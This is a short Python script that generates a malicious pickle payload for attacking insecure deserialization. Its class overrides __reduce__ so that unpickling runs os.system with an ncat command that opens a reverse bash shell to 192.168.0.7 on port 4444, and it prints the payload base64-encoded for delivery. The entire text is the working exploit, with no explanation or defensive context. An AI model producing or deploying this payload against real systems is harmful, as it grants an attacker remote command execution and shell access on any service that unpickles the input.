import pickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,("ncat 192.168.0.7 4444 -e /bin/bash",))
print(base64.b64encode(pickle.dumps(P())))
